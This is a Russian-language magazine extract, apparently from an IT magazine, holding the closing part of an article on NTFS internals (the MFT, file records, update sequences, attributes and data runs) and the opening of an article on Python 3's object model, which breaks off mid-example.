хранится в атрибуте типа 30h ($FILE_NAME).
   Если у файла есть одно или несколько альтернативных имен, таких атри‐
бутов может быть и несколько. Здесь же хра нится ссыл ка (ﬁle reference)
на родительский каталог, поз воляющая разобраться, к какому каталогу при‐
надлежит данный файл или подкаталог. По умол чанию данные файла хранят‐
ся в безымянном атрибуте типа 80h ($DATA). Однако при желании прикладные
программы могут создавать дополнитель ные потоки данных, отделяя имя
атрибута от име ни файла знаком двоеточия (нап ример: ECHO xxx > file:
attr1; ECHO yyy > file:attr2; more < file:attr1; more < file:at‐
tr2).
  Изначально в NTFS была заложена спо соб ность индексации любых атри‐
бутов, значительно сок ращающая время поиска файла по заданному спис ку
критериев (например, времени пос леднего доступа). Индексы хранятся
в виде двоичных деревьев, поэто му среднее время выполнения запроса оце‐
нивается как O(lg n). На практике в боль шинстве драй веров NTFS реали‐
зована индексация лишь по имени фай ла. Как уже говорилось ранее, каталог
представ ляет собой файл особого типа — файл ин дексов. В отличие от FAT,
где файл катало га представляет собой единс твенный источник данных
об организации файлов, в NTFS файл каталога используется лишь для уско‐
рения доступа к содержимому катало га. Он не явля ется обязательным, так
как ссылка на родительский каталог вся кого файла в обязательном порядке
присутствует в атрибуте его имени ($FILE_NAME).
  Каждый атрибут может быть зашифрован, раз режен или сжат. Техника
работы с такими атрибутами выходит далеко за рамки первичного знакомства
с организацией файловой системы. Мы же рас смотрим углубленно фун‐
дамент файловой системы NTFS — структуру $MFT.


ГЛАВНАЯ ФАЙЛОВАЯ ТАБЛИЦА
В процессе форматирования логичес кого раздела в его начале создается так
называемая зо на MFT (см.  рис.). По умолчанию она занимает 12,5%
от емкости тома (а не 12%, как утверждается во многих публикациях), хотя,
в зависимости от значения парамет ра NtfsMftZoneReservation, она может
составлять 25, 37 или 50%.





             Структура тома, отформа тированного под NTFS

В этой области расположен файл $MFT, изна чально занимающий поряд‐
ка 64 секторов и растущий от начала зоны MFT к ее концу по мере создания
новых пользовательских файлов и катало гов. Чем больше файлов содержится
на томе, тем больше размер MFT. Приблизительный раз мер файла $MFT мож‐
но оценить по следующей формуле: sizeof(FILE Record) N Files, где
sizeof(FILE Record) обычно составляет 1 Кбайт, а N Files — пол ное
количество файлов и подкатало гов раз дела, вклю чая недавно удаленные.
  Для предотвращения фрагментации файла $MFT зона MFT удерживается
зарезервирован ной вплоть до полного исчерпа ния свободного пространства
тома, затем незадействованный «хвост» зоны MFT усекается в два раза,
освобождая место для пользовательских файлов. Этот процесс может пов‐
торяться многократно, вплоть до полной отда чи всего зарезервированного
пространства. Решение кра сивое, хотя и не новое. Многие из файловых сис‐
тем восьмидесятых годов прош лого века позволяли резервировать заданное
дисковое пространство в хвосте активных файлов, сокращая их фрагмента‐
цию (причем любых файлов, а не только служеб ных). Например, такая спо‐
собность была у DOS 3.0, разработанной для персональных компьютеров
типа «Агат». Может быть, кто‐то из вас помнит такую машину?
   Когда файл $MFT дос тигает гра ниц зоны MFT, в ходе своего последу ющего
роста он неизбежно фрагментируется, вызывая обвальное падение произво‐
дительности файловой системы. При этом стоит заметить, что подавляющее
большинство дефрагментаторов файл $MFT не обрабаты вают! А ведь API
дефрагментации, встроенный в штатный драйвер NTFS, обес печивает такую
возможность!
  При необходимости файл $MFT может быть перемещен в любую часть дис‐
ка, и тогда в начале тома его уже не ока жется. Стартовый адрес фай ла $MFT
хранится в загрузоч ном секторе по смещению 30h байт от его начала. B
подавляющем боль шинстве случаев этот адрес ссылается на четвертый клас‐
тер.
  Файл $MFT представляет собой массив записей типа FILE Record (в тер‐
минологии UNIX они называются inodes), каждая из которых описывает соот‐
ветствующий ей файл или подкаталог. На практике один файл или подкаталог
полностью описывается единс твенной записью типа FILE  Record, хотя
в теории этих записей может пот ребовать ся и нес коль ко.
  Для ссылки на одну файловую запись из дру гой используется ее поряд‐
ковый номер (он же индекс) в файле $MFT, отсчитываемый от нуля. Фай-
ловая ссыл ка (ﬁle reference) сос тоит из двух час тей (см. табл.) — 48‐бит‐
ного ин декса и 16‐битного но мера последовательности (sequence
number).


 Смещение  Размер  Описание

                     Ин декс файловой записи (FILE record number),
 00h          6 байт
                          отсчитыва емый от нуля

 06h          2 байта   Номер пос ледовательности (sequence number)

При удалении файла или катало га соответству ющая ему файловая пос‐
ледовательность помечается как неиспользуемая. При соз дании новых фай‐
лов записи, помеченные как неиспользуемые, могут задействоваться вновь,
при этом счетчик номера пос ледовательнос ти, хра нящийся внутри файловой
записи, уве личивается на единицу. Этот механизм поз воляет отслеживать
«мертвые» ссылки на уже уда ленные фай лы. Номер пос ледовательности внут‐
ри файловой ссылки в этом случае будет отличаться от номера последова‐
тельности соответствующей файловой записи.
  Первые 12 записей в MFT всегда занимают слу жебные метафайлы: $MFT
(собственно сам файл $MFT), $MFTMirr (зеркало $MFT), $LogFile (файл тран‐
закций), $Volume (сведения о дисковом томе), $AttrDef (определения атри‐
бутов), '.' (корневой каталог), $Bitmap (карта свободного пространс тва),
$Boot (системный загрузчик), $BadClus (перечень плохих кластеров) и т. д.
  Первые четыре записи настолько важны, что про дублированы в специаль‐
ном файле $MFTMirr, находящемся примерно в середине тома (точный адрес
этого файла хранится в заг рузочном секторе по смещению 38h байт от его
начала). Вопреки своему названию, файл $MFTMirr — это отнюдь не «зер‐
кало» всего файла $MFT, а всего лишь резервная копия первых четырех его
элементов.
  Записи с 12‐й по 15‐ю помечены как используемые, в то время как в дей‐
ствительности они пусты. Как нес ложно догадаться, они зарезервированы
для использования в будущем. Записи с 16‐й по 23‐ю не задействованы
и честно помечены как неиспользуемые.
  Начиная с 24‐й записи располагаются пользовательские файлы и катало‐
ги. Четыре метафайла, впер вые появившихся в Windows 2000, — $ObjId,
$Quota, $Reparse и $UsnJrnl — могут рас полагаться в любой записи, номер
которой равен 24 или больше (не забудь, что нумерация файловых записей
начинается с нуля).


ФАЙЛОВЫЕ ЗАПИСИ
Структурно файловая запись сос тоит из заголовка  (header) и одного
или нескольких атрибутов (attributes) про изволь ной длины, завершаемых
маркером кон ца (end marker) — четырехбайтным шестнадцатеричным зна‐
чением FFFFFFFFh. Нес мотря на то что количес тво атрибутов и их длина
меняются от одной файловой записи к другой, раз мер самой структуры FILE
Record строго фиксирован. В большинстве случаев он равен 1 Кбайт (это
значение хранится в файле $boot, причем первый байт файловой записи
всегда совпадает с началом сектора).
   Если реальная длина атрибутов меньше размеров файловой записи, то ее
«хвост» просто не используется. Если же атри буты не умещаются в отведен‐
ное им пространство, создается дополнительная файловая запись  (extra
FILE Record ), ссылающаяся на свою предшественницу. Так выглядит струк‐
тура файловой записи:


FILE Record
    Header               ; Заголовок
    Attribute 1          ; Атрибут 1
    Attribute 2          ; Атрибут 2
    ...                  ; ...
    Attribute N          ; Атрибут N
End Marker (FFFFFFFFh)   ; Маркер конца

Первые четыре байта заголовка заняты «магической последовательностью»
FILE, сигнализирующей о том, что мы имеем дело с файловой записью типа
FILE Record. При восстановлении сильно фраг ментированного файла $MFT
это обстоятельство играет решающую роль, пос кольку позволяет отличить
сектора, принадлежащие MFT, от всех остальных секторов.
  Следом за сигнатурой идет 16‐раз рядный указатель, содержащий сме‐
щение последовательности обновле ния (update sequence). Под «ука‐
зателем» здесь и до конца раздела подразумевается смещение от начала
сектора, отсчитываемое от нуля и выраженное в бай тах. Последовательность
обновления хранится по смещению 002Dh, и поэтому сигнатура приобретает
следующий вид: FILE‐\x00.
   Размер заголовка варьиру ется от одной вер сии операционной системы
к другой и в явном виде нигде не хранится. Вместо этого в заголовке присутс‐
твует указатель на пер вый атрибут, содержащий его смещение в байтах отно‐
сительно начала файловой записи и рас положенный по смещению 14h байт
от начала сектора.
  Смещения последующих атрибутов (если они есть) определяются путем
сложения размеров всех предыдущих атрибутов (размер каждого из атри‐
бутов содержится в его заголовке) со смещением первого атрибута. За кон‐
цом последнего атрибута находится маркер конца — значение FFFFFFFFh.
  Длина файловой записи хра нится в двух полях. Тридцатидвухразрядное
поле ре ального раз мера (real size), находя щееся по смещению 18h байт
от начала сектора, содержит совокупный раз мер заголовка, всех его атри‐
бутов и маркера конца, округленный по 8‐байтной границе. Тридцатидвухраз‐
рядное поле вы делен ного раз мера (allocated size), находящееся по сме‐
щению 1Сh байт от начала сектора, содержит дей стви тельный раз мер фай‐
ловой записи в байтах, округленный по раз меру сектора. Документация
утверждает, что выделенный размер должен быть кратен размеру кластера,
но на практике это не так. Например, на моей машине длина поля выделен‐
ного размера равна четверти клас тера.
   16‐разрядное поле флагов, находя щееся по смещению 16h байт от начала
сектора, в подавляющем большинс тве случаев принимает одно из сле‐
дующих трех значений: 00h — данная файловая запись не используется,
или ассоциированный с ней файл или каталог удален, 01h — файловая
запись используется и описывает файл, 02h — файловая запись использует‐
ся и описывает каталог.
   64‐разрядное поле, находящееся по смещению 20h байт от начала сек‐
тора, содержит индекс базовой файловой записи. Для первой файловой
записи это поле всегда равно нулю, а для всех пос ледующих, расширенных
записей — индексу первой файловой записи. Расширенные файловые
записи могут находиться в любых областях MFT, не обязательно рас положен‐
ных рядом  с  основной  записью. Следователь но, необходим  какой‐то
механизм, обеспечивающий быстрый поиск расширенных файловых записей,
принадлежащих данному файлу (прос матривать всю MFT было бы слишком
нерационально). Этот механизм существу ет, и основан он на ведении спис‐
ков атрибутов  ($ATTRIBUTE_LIST). Список атрибутов представляет собой
специальный атрибут, добавляемый к первой фай ловой записи и содер‐
жащий индексы расширенных записей.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
       NTFS ИЗНУТРИ
              КАК УСТРОЕНА ФАЙЛОВАЯ ТАБЛИЦА MFT
                                 В WINDOWS





ПОСЛЕДОВАТЕЛЬНОСТЬ ОБНОВЛЕНИЯ
Будучи очень важными компонентами файловой сис темы, $MFT, INDEX
и $LogFile нуждаются в механизме контроля целостности своего содер‐
жимого. Традиционно для это го используются коды обнаружения и коррекции
ошибок (ECC/EDC codes). Одна ко на тот момент, когда проектировалась
NTFS, процессоры были не настолько быс трыми, как теперь, и расчет кор‐
ректирующих кодов занимал зна читель ное время, существенно снижающее
производительность файловой системы. Именно поэтому от использования
корректирующих кодов приш лось отказать ся. Вмес то них разработчики NTFS
применили так называемые последовательности обновле ния (update se‐
quences), также называемые fix-ups.
  В конец каждого из секторов, образующих файловую запись  (INDEX
Record, RCRD Record или RSTR Record), записы вается специальный 16‐бай‐
тный  но мер  последовательности  обновле ния  (update  sequence
number), дублируемый в заголовке фай ловой записи. При каждой операции
чтения два последних байта сектора сверяются с соответствующим полем
заголовка, и, если драйвер NTFS обна ружи вает рас хождение, данная фай‐
ловая запись считается недействительной.
  Основное  назначение  последовательностей  обновления —  защита
от «обрыва записи». Если в процессе записи сектора на диск исчезнет пита‐
ющее напряжение, может случиться так, что часть фай ловой записи будет
записана успешно, а другая часть сохранит прежнее содержимое (файловая
запись, как мы помним, обычно сос тоит из двух секторов). После восстанов‐
ления питания драйвер файловой системы не может уверенно опре делить,
была ли файловая запись сохранена целиком. Вот тут‐то последовательности
обновления и выручают! При каждой переза писи сектора пос ледователь‐
ность обновления увеличивается на единицу. Потому, если произошел обрыв
записи, значение последовательнос ти обновления, находящейся в заголовке
файловой записи, не совпадет с пос ледователь ностью обновления, рас‐
положенной в конце сектора.
  Оригинальное содержимое, рас положенное «под» последовательностью
обновления, хранится в специальном массиве обновле ния (update se‐
quence array), расположенном в заголовке фай ловой записи непосредс твен‐
но за концом сме щения пос ледова тельности обновления (update sequence
number). Для восстановления файловой записи в исходный вид необходимо
извлечь из заголовка ука затель на смещение пос ледовательности обновле‐
ния (он хранится по смещению 04h байт от начала заголовка) и све рить
лежащее по этому адресу 16‐байтное зна чение с последним словом каждого
из секторов, слагающих файловую запись  (INDEX  Record, RCRD  Record
или RSTR Record). Если они не совпадут, значит, соответс твующая структура
данных повреждена. Использовать такие структуры сле дует очень осторожно
(на первых порах лучше не использовать вооб ще).
  По смещению 006h от начала сектора находится 16‐разрядное поле, хра‐
нящее совокупный размер номера последователь ности обновления вместе
с массивом последовательности обновления  (sizeof(update  sequence
number) + sizeof(update sequence array)), выраженный в словах (не
в байтах!). Так как размер номера пос ледова тельности обновления всегда
равен одному слову, то размер мас сива последова тельнос ти обновления,
выраженный в байтах, должен вычислять ся следующим образом: (update
sequence number & update sequence array 1)*2. Таким образом, сме‐
щение      массива      оригинального      содержимого      равно
(offset to update sequence number) + 2.
  В Windows XP и более новых операционных системах эти значения рас‐
полагаются по смещениям 2Dh и 2Fh соот ветственно. Первое слово мас сива
последовательности обновления соответству ет пос леднему слову первого
сектора файловой записи или индексной записи. Второе — последнему сло‐
ву второго сектора и т. д.


АТРИБУТЫ
Структурно всякий атрибут состоит из атрибутного заголовка (attribute
header) и те ла атрибута (attribute body). Заголовок атрибута всегда хранит‐
ся в файловой записи, рас положенной внутри MFT. Тела резидентных атри‐
бутов хранятся там же. Нерезидентные атрибуты хранят свое тело вне MFT,
в одном или нескольких кластерах, перечисленных в заголовке данного атри‐
бута в специальном списке. Если 8‐разрядное поле, рас положенное по сме‐
щению 08h байт от начала атрибутного заголовка, равно нулю, то атрибут
считается резидентным, а если единице, то атрибут нерезидентен. Любые
другие значения недопустимы.
  Первые четыре байта атрибутного заголовка опре деляют его тип. Тип
атрибута, в свою оче редь, определяет формат представления тела атрибута.
В частности, тело атрибута данных (тип: 80h — $DATA) пред ставляет собой
«сырую» последовательность байтов. Тело атрибута стандартной информа‐
ции (тип: 10h — $STANDARD_INFORMATION) описыва ет вре мя его создания,
права доступа и т. д.
  Следующие четыре байта заголовка содержат длину атри бута, выража‐
емую в байтах. Длина нерезидентного атрибута равна сумме длин его тела
и заголовка, а длина резидентного атри бута равна длине его заголовка. Если
к смещению атрибута добавить его длину, мы получим указатель на сле‐
дующий атрибут (или маркер конца, если текущий атри бут — последний
в цепочке).
  Длина тела резидентных атрибутов, выраженная в байтах, хранится в 32‐
разрядном поле, расположенном по смещению 10h байт от начала атрибут‐
ного заголовка. 16‐разрядное поле, следующее за его концом, хранит сме‐
щение резидентного тела, отсчитываемое от начала атрибутного заголовка.
С нерезидентными атрибута ми в этом плане все намного сложнее, и для хра‐
нения длины их тела используется множес тво полей.
  Ре альный раз мер тела атрибута (real size of attribute), выраженный
в байтах, хранится в 64‐разрядном поле, находящемся по смещению 30h
байт от начала атрибутного заголовка. Следующее за ним 64‐разрядное поле
хранит инициализиро ван ный раз мер потока (initialized data size of the
stream), выраженный в байтах. Судя по всему, инициализированный размер
потока всегда равен реальному размеру тела атрибута. 64‐разрядное поле,
расположенное по смещению 28h байт от начала атрибутного заголовка, хра‐
нит вы делен ный раз мер (allocated size of attribute), выраженный в байтах
и равный реальному размеру тела атрибута, округленному до размера клас‐
тера (в большую сторону).
  Два 64‐разрядных поля, расположенные по смещениям 10h и 18h байт
от начала атрибутного заголовка, задают первый (starting VCN) и пос ледний
(last VCN) номера виртуального кластера, принадлежащего телу нерезиден‐
тного атрибута. Вир туальные кластеры представляют собой логические
номера кластеров, не завися щие от своего физического расположе ния
на диске. В подавляющем большинстве случаев номер первого кластера тела
нерезидентного атрибута равен нулю, а пос ледний — количеству кластеров,
занятых телом атрибута, умень шенному на единицу. 16‐разрядное поле, рас‐
положенное по смещению 20h от начала атрибутного заголовка, содержит
указатель на массив Data  Runs, рас положенный внутри этого заголовка
и описывающий логический порядок размещения нерезидентного тела атри‐
бута на диске.
  Каждый атрибут имеет свой собственный иден тификатор (attribute ID),
уникальный для данной файловой записи и хра нящийся в 16‐разрядном поле,
расположенном по смещению 0Eh от начала атрибут ного заголовка.
   Если атрибут имеет имя (attribute Name), то 16‐разрядное поле, рас‐
положенное по смещению 0Ah байт от атрибут ного заголовка, содержит ука‐
затель на него. Для безымянных атрибутов оно равно нулю (большинство
атрибутов имен не имеют). Имя атрибута хранится в атрибутном заголовке
в формате Unicode, а его длина определяется 8‐разрядным полем, рас‐
положенным по смещению 09h байт от начала атрибутного заголовка. Если
тело атрибута сжато, зашифровано или разрежено, 16‐разрядное поле фла‐
гов, расположенное по смещению 0Ch байт от начала атрибутного заголовка,
не равно нулю.


ТИПЫ АТРИБУТОВ
NTFS поддерживает большее количес тво предопределенных типов атри‐
бутов. Тип атрибута определяет его наз начение и формат пред ставления
тела. Полное описание всех атрибутов заняло бы целую книгу, поэтому кратко
перечислю лишь наиболее «ходовые» из них. Так, атрибут стандартной
информации $STANDARD_INFORMATION описыва ет время соз дания, изме‐
нения и последнего доступа к файлу, пра ва доступа, а также некоторую дру‐
гую вспомогательную информацию (например, кво ты).
   Атрибут списка атрибутов (пря мо каламбур) $ATTRIBUTE_LIST исполь‐
зуется в тех случаях, когда все атрибуты файла не умещаются в базовой фай‐
ловой записи и файловая система вынуждена располагать их в расширенных
файловых записях. Индексы расширенных файловых записей содержатся
в атрибуте списка атрибутов, помещаемом в базовую фай ловую запись.
  При каких обстоятельствах атрибуты не умещаются в одной файловой
записи? Это может произойти в следующих случаях:
 • файл содержит много альтернативных имен или жестких ссы лок;
 • файл сильно фрагментирован;
 • файл содержит очень сложный дескриптор безопасности;
 • файл имеет очень много потоков данных (т. е. атрибутов типа $DATA).

Атрибут полного имени файла $FILE_NAME хранит имя фай ла в соответству‐
ющем пространстве имен. Таких атрибутов у фай ла может быть и несколько.
Здесь же хранят ся и жесткие ссылки (hard link), если они есть.


СПИСКИ ОТРЕЗКОВ
Тела нерезидентных атрибутов хра нятся на дис ке в одной или нес кольких
кластерных цепочках, называемых отрезками (runs). Отрезком называется
последовательность  смежных  клас теров,  характеризующаяся  номером
начального кластера и длиной. Совокупность отрезков называется списком
(run‐list или data run).
   Внутренний формат представления списков не то чтобы сложен, но прос‐
тым его тоже не назовешь. Для экономии места длина отрезка и номер
начального кластера хранятся в полях переменной длины. Если размер
отрезка умещается в байт (т. е. его зна чение не превышает 255), то он займет
один байт. По аналогии, если раз мер отрезка требует для своего представ‐
ления двойного сло ва, то он займет двойное слово.
  Сами же поля размеров хра нят ся в 4‐битных ячейках, называемых ниб-
блами (nibble) или по лубайтами. Шес тнадцатеричная система счисления
позволяет легко переводить байты в ниб блы и наоборот. Младший ниббл
равен (X&15), а старший — (X/16). Иначе говоря, младший ниббл соответс‐
твует младшему шестнадцатеричному раз ряду байта, а старший — старшему.
Например, 69h состоит из двух ниб блов, при чем младший равен 9h, а стар‐
ший — 6h.
  Список отрезков представляет собой мас сив структур, каждая из которых
описывает характеристики «своего» отрезка. В конце спис ка находится
завершающий ноль. Первый байт структуры сос тоит из двух нибблов: млад‐
ший задает длину поля начального клас тера отрезка (условно обозначаемого
буквой F), а стар ший — количес тво кластеров в отрезке (L). Затем идет поле
длины отрезка. В зависимос ти от зна чения L оно может занимать от одного
до восьми байт (поля большей длины недопустимы). Первый байт поля стар‐
тового кластера файла рас положен по смещению 1+L байт от начала струк‐
туры (что соответствует 2+2*L нибблам). Вот как выглядит структура одного
элемента списка отрезков.


 Сме щение        Раз мер
                              Описание
 в нибблах         в нибблах

 0                  1                Раз мер поля длины (L)

                                      Раз мер поля начального клас‐
 1                  1
                                        тера (S)

                                    Количество         кластеров
 2                   2*L
                                         в отрезке

                                 Номер  начального  кластера
 2+2*L              2*S
                                         отрезка

Начиная с версии 3.0 NTFS поддерживает раз режен ные (sparse) атрибуты,
т. е. такие атрибуты, которые не записывают на диск кластеры, содержащие
одни нули. При этом поле номера начального клас тера отрезка может быть
равным нулю, что означает, что данному отрезку не выделен никакой клас тер.
Поле длины содержит количес тво кластеров, заполненных нулями.


НАЗНАЧЕНИЕ СЛУЖЕБНЫХ ФАЙЛОВ
NTFS содержит большое количество служебных файлов (метафайлов) строго
определенного формата. Важнейший из метафайлов, $MFT, мы только что
рассмотрели. Остальные метафайлы игра ют вспомогательную роль. Тем
не менее если они окажутся искажены, то штатный драйвер файловой сис‐
темы не сможет работать с таким томом, поэтому иметь некоторые представ‐
ления о назначении каждого из них все же необходимо.
   Краткие сведения о назначении важ нейших метафайлов приведе ны в сле‐
дующей таблице. К сожалению, в пределах одной статьи нет возможности
подробно  рассмотреть  структуру  всех существу ющих метафайлов,  но,
по крайней мере, можно составить общее представление об их назначении.





ЗАКЛЮЧЕНИЕ
Мы рассмотрели общую структуру NTFS версии 3.1, которая используется
начиная с Windows XP и заканчивая Windows Server 2019, включая, конечно же,
Windows 10. Эта информа ция поможет тебе лучше понять, как Windows хранит
файлы, а также может пригодиться в процессе восстановления поврежден‐
ных данных. Конечно же, подробное опи сание архитектуры NTFS может
занять отдельную и весьма объемную книгу (которых, кстати, существует
немало), но за подробнос тями ты всегда можешь обратиться к технической
документации.
 КОДИНГ





    Даниил Батурин
Координатор проекта VyOS
(https://vyos.io), «языковед»,
 функциональщик, иногда
  сетевой администратор
      daniil@baturin.org



ПЕРЕХОДИМ
   PYTHON 3НА
 КАК ПОПРОЩАТЬСЯ С PYTHON 2.7
 И КОДИТЬ ДАЛЬШЕ




 В этом году анонсирован последний выпуск Python 2.7, пос‐
  ле чего Python Software Foundation перестанет поддержи вать
  ветку 2.7. Множество популярных библиотек и фрей мворков
  тоже прекращают официальную поддержку Python 2, а целый
  ряд дистрибутивов  Linux уже не включают его в набор
  пакетов по умолчанию.


  Конечно, Python 2 не исчез из реальнос ти, как только питоночасы про‐
  били 00:00, но он уже стал темным прошлым, а не суровым настоящим.
  Начинающие могут смело зна комиться с Python 3 без оглядки на 2.7, что
  сильно упрощает жизнь.
    Популярность Python привела к тому, что многие люди изучают его нефор‐
  мально: по чужим примерам и статьям в блогах. В таком методе нет ничего
  плохого, но есть риск упустить важные особенности поведения.
    Сегодня мы сфокусируемся на объектной модели. Синтаксис создания
  классов и объектов в Python дос таточно очевиден, а вот детали поведе ния —
  не всегда. Для опытных пользователей эта информация обще известна, но у
   тех, кто переходит от написания коротких скриптов и использования чужих
  классов к созданию своих приложений, порой вызыва ет сложности.


  ИЕРАРХИЯ КЛАССОВ И OBJECT
  Начнем с самого простого случая — с классов, у которых нет явно указанного
  предка.
    В Python 3 у любого пользовательского клас са есть как минимум один
  базовый класс. В кор не иерархии классов находится встроенный класс ob‐
  ject — пре док всех клас сов.
    В учебных материалах и коде часто можно видеть такую конструкцию:


  class MyClass(object):
      pass

  В Python 3 она избыточна, пос кольку object — базовый класс по умол чанию.
  Можно смело писать так:


  class MyClass:
      pass

  Популярность явного синтаксиса в коде на Python 3 связана с существовав‐
  шей долгое время необ ходимостью поддержи вать обе ветки.
    В Python 2.7 син таксис MyClass(object) был нужен, чтобы отличать
  «новые» классы от режима совместимос ти с доисторическими версиями.
  В Python 3 никакого режима совместимос ти с нас ледием старых версий
  просто не существует, поэто му наконец можно вернуться к более короткому
  старому синтаксису.
     Что особенного в клас се object?
    1. У него самого нет базово го клас са.
    2. У объектов этого класса не только нет атрибутов и методов — нет даже
     возможности их присвоить.


  >>> o = object()
  >>> o.my_attribute = None
  Traceback (most recent call last):
    File "<stdin>", line 1, in <module>
  AttributeError: 'object' object has no attribute 'my_attribute'

  «Техническая» причина  это му —  отсутс твие  у object поля __dict__,
  в котором хранятся все поля и методы класса.


  ИНКАПСУЛЯЦИЯ И «ЧАСТНЫЕ» АТРИБУТЫ
  Попытка изменить значение поля у объекта клас са object — это единствен‐
  ный случай, когда нечаянное или намеренное изменение атрибута уже соз‐
  данного объекта завершится с ошиб кой.
    Во всех остальных случаях можно поменять любые атри буты объ екта
  и никаких ошибок это не вызовет — ошиб ки возникнут потом, когда в другом
  месте кода кто‐то обратит ся к модифицированным полям.


  >>> class MyClass:
  ...   def my_method(self):
  ...     print("I'm a method")
  ...
  >>> o = MyClass()
  >>> o.my_method = None
  >>> o.my_method()
  Traceback (most recent call last):
    File "<stdin>", line 1, in <module>
  TypeError: 'NoneType' object is not callable

  Можно также добавить в уже созданный объект про извольные поля — класс
  объекта определяет, какие поля и методы у него будут сразу после создания,
  но никак не ограничивает, какие поля у него мо гут быть во время выпол‐
  нения.
     Казалось бы, инкапсу ляция — один из трех фундаментальных принципов
  ООП, наравне  с наследова нием и полиморфизмом.  Главное правило
  инкапсуляции — не давать пользователю объекта вносить в него не пре дус‐
  мотренные автором изменения. Одна ко даже без доступа к исходному коду
  достаточно упертый пользователь найдет способ модифицировать что угод‐
  но. Дух этого правила в другом: однозначно дать понять пользователю, где
  заканчивается стабильный публичный интерфейс и начинаются детали реали‐
  зации, которые автор может поменять в любой момент.
    Для этого в Python есть один встроенный механизм. Те поля и методы,
  которые не вхо дят в публичный интерфейс, называют с подчеркивани ем
  перед именем: _foo, _bar. Никакого влияния на работу кода это не оказыва‐
   ет, это просто просьба не использовать такие поля бездумно.
    Для создания частных (private) атрибутов применя ются два под черкивания
   (__foo, __bar). Такие поля будут видны изнутри объекта под своими исходны‐
  ми именами, но вне объекта к ним применяется name mangling — переиме‐
  нования в стиле _MyClass__my_attribute:


  class MyClass:
      x = 0
      _x = 1
      __x = 2
      def print_x(self):
          print(self.__x)


  >>> o = MyClass()
  >>> o.print_x()
  2
  >>> o.x
  0
  >>> o._x
  1
  >>> o.__x
  Traceback (most recent call last):
    File "<stdin>", line 1, in <module>
  AttributeError: 'MyClass' object has no attribute '__x'
  >>> o._MyClass__x
  2

  Как видишь, это все еще дос таточно мягкое огра ничение дос тупа — просто
  настойчивая просьба не использовать частные поля в обход публичного
  интерфейса объекта.


              INFO

                      Переименование  не  применяется   к  полям
                        и методам с подчеркиванием с двух сторон вроде
                     __init__. По соглашению такие име на дают
                          «магическим методам», на которых построены
                          все внут ренние интерфейсы стан дартной биб‐
                          лиотеки Python: к примеру, o = MyClass() —
                           это эквивалент o =  MyClass.__new__(My‐
                     Class). Такие методы, очевидно, должны быть
                         доступны извне объекта под исходными именами.


  Сэкономить вре мя на соз дание публичного интерфейса к час тным полям
  можно с помощью встроенного декоратора @property. Он создает поле,
  которое выглядит как переменная только для чтения — попытка присвоить
  значение вызовет исключение AttributeError. Для примера соз дадим
  класс с логическим значением _boolean_property, которое можно поменять
  только методом set_property, откло няющим значения всех типов, кроме
  bool.


  class MyClass:
      def __init__(self):
          self._boolean_property = True
      @property
      def my_property(self):
          return self._boolean_property
      def set_property(self, value):
          if type(value) == bool:
              self._boolean_property = value
          else:
              raise ValueError("Property value must be a bool")


  >>> o = MyClass()
  >>> o.my_property
  True
  >>> o.my_property = False
  Traceback (most recent call last):
    File "<stdin>", line 1, in <module>
  AttributeError: cant set attribute


  >>> o.set_property(9)
  Traceback (most recent call last):
    File "<stdin>", line 1, in <module>
    File "<stdin>", line 11, in set_property
  ValueError: Property value must be a bool


  >>> o.set_property(False)
  >>> o.my_property
  False

  Функцию set_property можно было завернуть в декоратор @my_property.
  setter, в этом слу чае присваивание o.my_property = False работало бы,
  а o.my_property = 9 вызывало ValueError.


  ПРОВЕРКА СООТВЕТСТВИЯ ТИПОВ
  В предыдущем примере мы явно проверяем, что тип значения — bool,
  с помощью type(value) == bool. В случае с bool это оправданно, посколь‐
  ку никакой другой тип не может его заменить в логичес ких выраже ниях, а нас‐
  ледоваться от него Python нам не даст.
    В общем случае проверять type() — плохая идея, поскольку не учитывает
  ни возможность наследования, ни возможность соз дать свои клас сы с сов‐
  местимым интерфейсом.
    Для проверки совместимости с неким базовым клас сом нужно исполь‐
  зовать isinstance(object, class). Эта проверка истинна для класса class
  и всех его потомков.


  >>> class Foo:
  ...   pass
  ...
  >>> class Bar(Foo):
  ...   pass
  ...
  >>> x = Foo()
  >>> y = Bar()
  >>> isinstance(x, Foo)
  True
  >>> isinstance(y, Foo)
  True
  >>> type(y) == Foo
  False

  Такая проверка оправданна в функциях, которые работают с объектами
  заранее известных классов из твоих же модулей.
    А вот в библиотеке для широкого круга пользователей даже isinstance()
  может быть слишком жес тким огра ничением. Почти все встроенные воз‐
  можности Python основаны на соглашениях о «магических методах», включая
  арифметические операторы, итерацию, контексты ( with ... as ...) и мно‐
  гое другое. Сторонний разработчик вполне может создать свой контейнер,
  который можно использовать наравне со встроенными list и dict, или,
  к примеру, запускать и завершать работу демонов через интерфейс контек‐
   ста.
    Поэтому, если твой код делает предположения только об ин терфейсе
  объектов, но не о деталях их поведения, лучше всего не проверять их тип,
  а отлавливать возникшие при вызове метода исклю чения и выдавать ошибки
  в стиле Object is not iterable.


 О РЕГИСТРЕ БУКВ И СЛОВЕ SELF
  На телефонном собеседовании в одной крупной компании меня однажды
  спросили, какое ключевое сло во обязательно использовать как первый аргу‐
  мент метода в Python. Я сна чала даже не понял смысл вопроса — такого обя‐
  зательного ключевого сло ва не существу ет. Дело в том, что многие сог‐
  лашения в Python так силь ны, что их соблюда ют, даже если это не обя затель‐
  но.
    В стандартной библиотеке Python и сооб щес тве его пользователей
  повелось, что названия клас сов начина ются с заглавной буквы, а ссылку
  на сам объект име нуют self. Одна ко ни то, ни дру гое не является элементом
  синтаксиса языка, в отличие от this в Java.
     Эти два определения клас са эквивален тны:


  class MyClass:
      def __init__(self, x):
          self.x = x


  class myclass:
      def __init__(this, x):
          this.x = x

  Важно только  то,  что первый  аргумент метода — это всегда ссылка
  на вызывающий его объект.


  СТАТИЧЕСКИЕ МЕТОДЫ И МЕТОДЫ КЛАССА
  Этим метод объекта и отличается от просто функции — при вызове ему неяв‐
  но передается ссылка на какой‐то объект в качестве первого аргумента.
  На какой именно объект? По умолчанию — на экземпляр, которому принад‐
  лежит метод. С помощью декораторов @classmethod и @staticmethod
  это поведение можно изменить.
    Декоратор @classmethod передает в метод ссылку на сам класс, а не
  на его конкретный экземпляр. Это дает возможность вызывать метод
  без создания объекта. А вот @staticmethod, по сути, и не метод вовсе,
  а просто функция, никакой неявной переда чи ссы лок таким методам не про‐
  исходит.
    Посмотрим на пример. Обрати внимание: x — поле класса, а не объ‐
  ектов‐экземпляров.


  class MyClass:
      x = 10
      @staticmethod
      def foo():
          print(x)


      @classmethod
      def bar(self):
